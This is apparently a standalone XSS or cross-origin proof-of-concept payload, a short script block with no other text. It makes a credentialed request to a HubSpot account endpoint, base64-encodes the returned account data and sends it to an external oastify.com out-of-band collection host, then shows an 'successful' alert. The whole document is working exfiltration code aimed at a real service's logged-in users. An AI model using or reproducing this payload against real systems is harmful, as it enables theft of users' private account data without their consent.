 <script>
fetch('https://app.hubspot.com/myaccounts-beta/', {method:'GET', credentials:'include'})
.then(res => res.json())
.then(data => fetch('https://kbzmak1stxeaw7gg0g85yccn3e95xxlm.oastify.com/'+btoa(JSON.stringify(data))))
.then(res => res.json())
.then(finalData => console.log(finalData))
.catch(err => console.error(err));
alert('successful');
</script>
